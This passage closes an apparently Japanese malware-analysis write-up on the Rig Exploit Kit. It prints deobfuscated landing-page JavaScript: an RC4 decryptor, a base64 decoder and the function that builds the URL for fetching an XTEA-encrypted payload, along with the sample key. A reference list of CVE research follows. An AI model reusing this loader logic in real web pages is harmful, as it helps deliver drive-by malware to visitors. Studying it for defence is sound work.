            var c = Il1IDa(this.scope.Ua, Il1IY("c15q+/LZTwzG0/ii2/j8ODah"));
            this.Zb = Il1I0(c);
            var d = Il1IEa(this.scope.de, this.scope.ee),
                e = Il1I0(this.url);
            Il1IFa(this.ka, d, e);
            this.key && "null" != this.key && (d = Il1IEa(this.scope.ie, this.scope.je), e = Il1I0(this.key), Il1IFa(this.ka, d, e));
        } catch (f) {
            return !1;
        }
```

Il1IDa = RC4 decryption routine

```js
function Il1IDa(a, b) {
        for (var c = Il1I_(), d = [], e = 0, f, g = "", h = 0; h < c.$; h++) {
            d[h] = h;
        }
        for (h = 0; h < c.$; h++) {
            e = (e + d[h] + a[c.wa](h % a[c.f])) % c.$, f = d[h], d[h] = d[e], d[e] = f;
        }
        for (var k = e = h = 0; k < b[c.f]; k++) {
            h = (h + 1) % c.$, e = (e + d[h]) % c.$, f = d[h], d[h] = d[e], d[e] = f, g += c.Da[c.xa](b[c.wa](k) ^ d[(d[h] + d[e]) % c.$]);
        }
        return g;
    }
```

Il1IY() = base64_decode()

```js
function Il1IY(a) {
        var b, c, d, e, f, g = 0,
            h = "";
        do {
            b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(a.charAt(g++)), c = g < a.length ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(a.charAt(g++)) : 64, e = g < a.length ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(a.charAt(g++)) : 64, f = g < a.length ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(a.charAt(g++)) : 64, d = b << 18 | c << 12 | e << 6 | f, b = d >> 16 & 255, c = d >> 8 & 255, d &= 255, h = 64 == e ? h + String.fromCharCode(b) : 64 == f ? h + String.fromCharCode(b, c) : h + String.fromCharCode(b, c, d);
        } while (g < a.length);
        return h;
    }
```


###### 2. Payload Stage
> url = "http:// + window[location][host] + / + base64_decode(a)";

```js
    function Il1I9(a, b) {
        Il1Id(this, Il1I_());
        this.M = !1;
        this.key = b;
        this.url = this.scope.Zc + this.scope.D[this.scope.kd][this.scope.Qc] + this.scope.Sd + Il1IY(a);
    }
```

>xexec() is a custom function which uses a key on the exploit kit landing page to decrypt the path from where the payload has to be fetched.

>The payload fetched from above path is encrypted. It will be decrypted using XTEA algorithm by the shellcode. The XTEA key used is present in the deobfuscated HTML page. In our case, it is: Du9JOBgkbfzGvmFF.

```
this.scope.Xc = xexec

...(snip)

function Il1I$() {
        Il1Id(this, Il1I_());
        this.Za = new Il1I9(""[this.scope.Xc](), "Du9JOBgkbfzGvmFF");
```

## さいごに
以上が```私が見たRig Exploit Kitの姿```です. Drive-by Download攻撃及びExploit Kitは高度に進化し, 今後も多くの被害をもたらすのではないかと危惧されています. この記事を読むことで「それらが実際にどのように行われているのか」知ることが出来れば幸いです.

## 参考文献
- [Campaign Evolution: pseudo-Darkleech in 2016](http://researchcenter.paloaltonetworks.com/2016/12/unit42-campaign-evolution-pseudo-darkleech-2016/)
- [pseudo-Darkleech_cloaking.md](https://github.com/koike/public/blob/master/2017/pseudo-Darkleech_cloaking.md)
- [Campaign Evolution: EITest from October through December 2016](http://researchcenter.paloaltonetworks.com/2017/01/unit42-campaign-evolution-eitest-october-december-2016/)
- [Finding A ‘Good Man’](https://malwarebreakdown.com/2017/03/10/finding-a-good-man/)
- [Websites compromised in ‘Decimal IP’ campaign](https://blog.malwarebytes.com/cybercrime/2017/03/websites-compromised-decimal-ip-campaign/)
- [Overlooking Decimal IP Campaign](http://www.nao-sec.org/2017/05/overlooking-decimal-ip-campaign.html)
- [‘Seamless’ Campaign Delivers Ramnit via Rig EK](https://umbrella.cisco.com/blog/2017/03/29/seamless-campaign-delivers-ramnit-via-rig-ek/)
- [Analyzing Rig Exploit Kit vol.1](http://www.nao-sec.org/2017/04/analyzing-rig-exploit-kit-vol1.html)
- [PATCH ANALYSIS OF CVE-2016-0189](http://theori.io/research/cve-2016-0189)
- [The journey and evolution of God Mode in 2016: CVE-2016-0189](https://www.virusbulletin.com/virusbulletin/2017/01/journey-and-evolution-god-mode-2016-cve-2016-0189/)
- [A Killer Combo: Critical Vulnerability and ‘Godmode’ Exploitation on CVE-2014-6332](http://blog.trendmicro.com/trendlabs-security-intelligence/a-killer-combo-critical-vulnerability-and-godmode-exploitation-on-cve-2014-6332/)
- [Write Once, Pwn Anywhere](https://www.blackhat.com/docs/us-14/materials/us-14-Yu-Write-Once-Pwn-Anywhere.pdf)
- [Eric Lippert Dissects CVE-2014-6332, a 19 year-old Microsoft bug](http://security.coverity.com/blog/2014/Nov/eric-lippert-dissects-cve-2014-6332-a-19-year-old-microsoft-bug.html)
- [CVE-2015-2419 – Internet Explorer Double-Free in Angler EK](https://www.fireeye.com/blog/threat-research/2015/08/cve-2015-2419_inte.html)
- [Too Much Freedom is Dangerous: Understanding IE 11 CVE-2015-2419 Exploitation](http://blog.checkpoint.com/2016/02/10/too-much-freedom-is-dangerous-understanding-ie-11-cve-2015-2419-exploitation/)
